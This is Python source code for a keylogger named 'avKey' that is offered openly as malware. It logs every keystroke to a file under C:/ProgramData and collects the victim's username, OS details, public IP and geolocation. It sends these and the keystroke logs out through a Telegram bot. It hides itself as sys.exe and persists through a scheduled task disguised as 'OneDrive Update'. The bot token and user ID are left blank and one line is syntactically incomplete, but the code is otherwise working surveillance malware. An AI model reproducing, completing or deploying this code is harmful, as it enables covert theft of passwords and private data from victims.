from pynput.keyboard import Listener
import telebot
import os
import getpass
import platform
import requests
from pynput.keyboard import Key, Controller
import geocoder
import shutil
import ctypes
import subprocess
import sys

token = '' #BOT TOKEN
usr =  #ID
size = [200,201,202,203,204,205,206,207,208,209,210,211] #Change if you need (it is list of symbols)

#Main variables
CurrentName = os.path.basename(sys.argv[0])
CurrentPath = sys.argv[0]
g = geocoder.ip('me')
keyboard = Controller()
uname = platform.uname()
r = requests.get('http://ip.42.pl/raw')
IP = r.text
bot = telebot.TeleBot(token)
wdusr = os.getlogin()
path = "C:/ProgramData/logs.txt"

def AddToAutorun():
	subprocess.call('schtasks /create /f /sc onlogon /rl highest /tn "' + 'OneDrive Update' + '" /tr "' + 'C:\\ProgramData\\' + 'sys.exe' + '"',
		shell=True)

def CopyToAutorun(CurrentPath):
	shutil.copy2(CurrentPath, r'' + 'C:\\ProgramData\\' + 'sys.exe')
	ctypes.windll.kernel32.SetFileAttributesW('C:\\ProgramData\\' + 'sys.exe', 2)


# Checking if a task exists in the task scheduler

schtasks = '@chcp 65001 && @schtasks.exe'


def SchtasksExists():
	try:
		Process = subprocess.check_output(f'{schtasks} /query /tn \"{"OneDrive Update"}\"',
			shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode(encoding='utf-8', errors='strict')
	except subprocess.CalledProcessError:
		return False
	else:
		return not 'ERROR:' in Process


# Checking if a file exists in the installed directory

def InstallPathExists():
	if os.path.exists('C:\\ProgramData\\' + 'System_settings.exe'):
		return True

#New target
bot.send_message(usr, "*🟢 NEW TARGET 🟢*" + '\n' + '\n*PC System Info:*' '\n├👤 Windows user: ' + wdusr + "\n├⚙️ OS: " + uname.system +  "\n├⚙️ OS VERSION: " + uname.version + "\n╰⚙️ Sys Type: " + uname.machine + '\n\n*Location Info:*'  '\n├🌐 IP adress ' + IP +  '\n├🗺️ City: ' + str(g) +  '\n╰🗺️ Longitude Latitude: ' + str(g.latlng), parse_mode='Markdown')
bot.send_message(usr, "*🟢 Coded by @termuxqew 🟢* \n\nhttps://github.com/fuckwbored/avKeylogger")
try:
	AddToAutorun()
	CopyToAutorun(CurrentPath)
	SchtasksExists()
	InstallPathExists()
	bot.send_message(usr, '☺️Startup created')
except:
	bot.send_message(usr, '😓Startup not created')

#Create txt file (for future logs)
f = open (path, mode = "w")
f.write("")

#Main func
def log_keystroke(key):
	key = str(key).replace("'", "")
#Normilize hotkeys
	if key == 'Key.space':
	    key = ' '
	if key == 'Key.shift_r':
	    key = ''
	if key == "Key.enter":
		key = '\n'
	if key == 'Key.ctrl_l':
		key ='[CTRL]+ '
	if key == 'Key.tab':
		key = '	'
	if key == 'Key.esc':
		key = ' [ESC] '
	if key == 'Key.shift':
		key = '[SHIFT]'
	if key == 'Key.delete':
		key = '[DEL]'
	if key == 'Key.backspace':
		key = '[BCKSP]'
	if key == 'Key.left':
		key = '[<-]'
	if key == 'Key.right':
		key = '[->]'
	if key == 'Key.down':
		key = '[DOWN]'
	if key == 'Key.up':
		key = '[UP]'
	if key == 'Key.alt_l':
		key = '[ALT]'
	if key == 'Key.f1':
		key = '[F1]'
	if key == 'Key.f2':
		key = '[F2]'
	if key == 'Key.f3':
		key = '[F3]'
	if key == 'Key.f4':
		key = '[F4]'
	if key == 'Key.f5':
		key = '[F5]'
	if key == 'Key.f6':
		key = '[F6]'
	if key == 'Key.f7':
		key = '[F7]'
	if key == 'Key.f8':
		key = '[F8]'
	if key == 'Key.f9':
		key = '[F9]'
	if key == 'Key.f10':
		key = '[F10]'
	if key == 'Key.f11':
		key = '[F11]'
	if key == 'Key.f12':
		key = '[F12]'
	if key == 'Key.cmd':
		key = '[WIN]'
#Write keylogs to txt file (we create 2 variabls to write & control size)
	text_file = open(path, "r+")
	f = open(path, 'a')
	f.write(str(key))
#Get size (1 symbol = 1b(byte))
	for siz in size:
		b = os.path.getsize(path)
		if b == siz:
			bot.send_document(usr, text_file, caption=wdusr + ' keylogs✅' + '\n\n_© avKey Coded by @termqew(Daniil) \n@termuxqew - subscribe')
			text_file.truncate(0)

#Start listen
with Listener(on_press=log_keystroke) as l:
	l.join()

if __name__ == '__main__':
    bot.polling(none_stop=True)
